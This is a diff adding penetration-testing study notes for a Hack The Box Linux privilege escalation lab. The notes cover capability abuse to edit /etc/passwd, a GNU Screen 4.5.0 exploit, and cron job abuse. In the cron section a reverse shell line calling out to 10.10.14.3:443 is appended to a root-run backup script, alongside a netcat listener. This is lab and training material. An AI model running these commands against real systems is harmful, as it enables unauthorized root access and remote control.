@@ -190,3 +190,37 @@ $find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} 
 Utilizing the cap_dac_override capability on the vim.basic binary (which allows for override of access controls), students need to use the binary to view the /etc/passwd file, deleting the x on the line for the root user:
 su root 
 $cat /root/flag.txt
+---------------------
+Vulnerable Services
+Screen Version Identification
+$screen -v 
+Privilege Escalation - Screen_Exploit.sh
+./screen_exploit.sh
+#id 
+Screen_Exploit_POC.sh
+https://academy.hackthebox.com/module/51/section/468
+
+searchsploit "GNU Screen 4.5.0"
+scp 41154.sh htb-student@PWNIP:/home/htb-student/
+------------------
+Cron Job Abuse
+he cron file will be created in /var/spool/cron for the specific user that creates it.
+ minutes, hours, days, months, weeks, commands. For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours.
+ Certain applications create cron files in the /etc/cron.d directory and may be misconfigured to allow a non-root user to edit them.
+$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+look in the /dmz-backups directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like 0 */3 * * * but instead wrote */3 * * * *, which tells the cron job to run every three minutes. The second issue is that the backup.sh shell script is world writeable and runs as root.
+$ls -la /dmz-backups/
+Let's run pspy and have a look. The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan procfs every 1000ms (or every second).
+ using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.
+./pspy64 -pf -i 1000
+> $ cat /dmz-backups/backup.sh 
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+#!/bin/bash
+SRCDIR="/var/www/html"
+DESTDIR="/dmz-backups/"
+FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
+tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
+ 
+bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+nc -lnvp 443
+id  > hostname
